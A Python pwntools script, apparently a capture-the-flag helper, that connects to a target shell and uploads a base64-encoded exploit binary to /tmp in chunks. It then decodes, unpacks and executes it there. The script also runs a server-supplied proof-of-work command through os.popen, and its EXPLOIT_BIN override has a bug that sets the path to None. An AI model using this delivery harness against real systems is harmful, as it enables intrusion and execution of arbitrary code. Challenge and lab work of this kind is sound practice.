#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys,os

hosts = ("","localhost","localhost")
ports = (0,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker

exploit_bin = "exploit.gz.b64"


## exploit ###########################################

def exploit():
  global c

  if os.getenv("REQUIRE_POW") == "1":
    hashcat = c.recvline().rstrip().decode('utf-8')
    print("[+] calculating PoW...")
    hash_res = os.popen(hashcat).read()
    print("[+] finished calc hash: " + hash_res)
    c.sendline(hash_res)

  # before run this script, compile/gzip/base64 the exploit.
  with open(exploit_bin, 'r') as f:
    binary = f.read()

  progress = 0
  N = 0x300

  c.sendlineafter('$', 'cd /tmp')

  print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
    c.sendlineafter('$', 'echo -n "{}" >> exploit.gz.b64'.format(s)) # don't forget -n
    progress += N
    if progress % N == 0:
      print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))
  c.sendlineafter('$', 'base64 -d exploit.gz.b64 > exploit.gz')
  c.sendlineafter('$', 'gunzip ./exploit.gz')

  c.sendlineafter('$', 'chmod +x ./exploit')
  c.sendlineafter('$', './exploit')



## main ##############################################

def _overwrite_targets():
  # overwrite targets by envvar
  global rhp1, exploit_bin

  host = os.getenv("EXPLOIT_HOST")
  if host is not None:
    rhp1["host"] = host

  port = os.getenv("EXPLOIT_PORT")
  if port is not None:
    rhp1["port"] = port

  _exploit_bin = os.getenv("EXPLOIT_BIN")
  if exploit_bin is not None:
    exploit_bin = _exploit_bin

if __name__ == "__main__":
    global c

    _overwrite_targets()

    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        print("[+] Using target as {}:{}".format(rhp1["host"], rhp1["port"]))
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])

    exploit()
    c.interactive()
